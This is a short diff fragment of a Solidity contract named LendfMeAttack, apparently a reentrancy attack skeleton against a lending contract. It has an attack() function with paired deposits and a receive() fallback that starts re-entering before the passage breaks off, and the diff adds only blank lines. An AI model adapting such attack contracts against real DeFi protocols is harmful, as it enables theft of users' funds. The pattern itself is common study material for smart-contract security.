@@ -10,12 +10,14 @@ contract LendfMeAttack {
     constructor(address _targetAddress) {
         target = LendfMe(_targetAddress);
     }
+
     function attack() public payable {
         attacked = true;
         target.deposit(10 ether);
         attacked = false;
         target.deposit(10 ether);
     }
+
     receive() external payable {
         if (!attacked) {
             attacked = true;
